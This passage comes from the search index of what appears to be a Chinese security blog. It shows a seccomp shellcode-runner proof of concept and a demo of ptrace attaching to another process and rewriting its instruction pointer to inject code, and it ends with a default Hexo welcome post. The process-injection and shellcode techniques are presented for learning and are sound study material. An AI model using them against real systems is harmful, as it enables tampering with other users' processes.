class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc poc.c -o poc -lseccomp -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sec</span><span class="params">()</span>&#123;</span><br><span class="line">scmp_filter_ctx ctx;</span><br><span class="line">    ctx = seccomp_init(SCMP_ACT_ALLOW);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(openat), <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> seccomp_load(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">sec();</span><br><span class="line"><span class="type">char</span> *ptr = mmap(<span class="number">0x1000000</span>,<span class="number">0x1000</span>,<span class="number">7</span>,<span class="number">34</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">read(<span class="number">0</span>,ptr,<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(</span></span><br><span class="line"><span class="params"><span class="string">&quot;.intel_syntax noprefix\n&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;mov rax, 0x1000000\n&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;call rax\n&quot;</span></span></span><br><span class="line"><span class="params"><span class="string">&quot;.att_syntax noprefix\n&quot;</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用结果</p><p><img src="https://cdn.jsdelivr.net/gh/sheratan4/picture@main/img/202409051657179.png" alt="ptrace_2"></p><h2 id="利用ptrace修改rip"><a href="#利用ptrace修改rip" class="headerlink" title="利用ptrace修改rip"></a>利用ptrace修改rip</h2><p><a href="https://bbs.kanxue.com/thread-275442.htm">参考</a><br>ptrace既然可以用来修改寄存器，那么也是可以修改rip的，当环境中设置<code>echo 0 &gt; /proc/sys/kernel/yama/ptrace_scope</code>那么就是也许一个进程被另一个进程附加，从而会导致代码注入等危害。<br>下面利用一个demo来验证，还是先贴出代码，分为server（调试方）、client（被调试方）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ptrace_server</span></span><br><span class="line"><span class="comment">// gcc ptrace_server.c -o ptrace_server -g -w</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;input pid:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;pid);</span><br><span class="line">    </span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        ptrace(PTRACE_SYSCALL, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        ptrace(PTRACE_GETREGS, pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        <span class="keyword">if</span> (regs.orig_rax != <span class="number">0</span>)&#123;</span><br><span class="line">            regs.rip = <span class="number">0x4011e2</span>;</span><br><span class="line">            ptrace(PTRACE_SETREGS, pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">            ptrace(PTRACE_DETACH, pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ptrace_client</span></span><br><span class="line"><span class="comment">// gcc ptrace_client.c -o ptrace_client -g -w -no-pie</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,getpid());</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x20</span>);</span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    close(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cilent关闭了pie为了server设置rip方便，下面是运行结果</p><p><img src="https://cdn.jsdelivr.net/gh/sheratan4/picture@main/img/202409051657473.gif" alt="ptrace_3"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/post/4a17b156.html"/>
      <url>/post/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><h3 id="what-…………"><a href="#what-…………" class="headerlink" title="what …………"></a>what …………</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">test</span> dsadasdasdas</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
